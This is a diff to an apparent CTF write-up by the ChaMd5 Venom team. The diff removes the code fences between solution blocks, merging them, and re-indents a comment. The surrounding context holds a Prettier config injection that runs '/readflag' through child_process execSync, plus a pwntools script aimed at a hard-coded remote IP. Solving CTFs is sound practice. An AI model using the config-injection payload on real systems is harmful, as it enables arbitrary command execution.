@@ -30,11 +30,6 @@ ChaMd5 Venom 招收大佬入圈
 
 ```
 trailingComma: "es5"tabWidth: 4semi: falsesingleQuote: trueparser: ".prettierrc"d: var load = global.process.mainModule.constructor._loada: function exec(cmd){return load('child_process').execSync(cmd).toString()}b: var flag = exec("/readflag")p1: function babel(text, parsers, opts = {}) {return text+flag};p2: module.exports=babel
-```
-
-
-
-```
 function to8(n)
     return n % 256
 end
@@ -114,11 +109,6 @@ function Decrypt()
 end
 
 Decrypt()
-```
-
-
-
-```
 from pwn import *
 from Crypto.Util.number import *
 a=remote("190.92.234.114",23334)
@@ -139,7 +129,7 @@ for i in range(len(T)):
    y+=T[i]
 x = x // y
 x=long_to_bytes(x)
-#print(x)
+    #print(x)
 m=sorted('rctf_')
 s=''
 for i in range(len(m)):
@@ -148,11 +138,6 @@ x = x[:15]+s.encode()
 x= bytes_to_long(x)
 a.sendlineafter(b"x = ",str(x).encode())
 a.interactive()
-```
-
-
-
-```
 import base64
 from Crypto.Cipher import AES
 
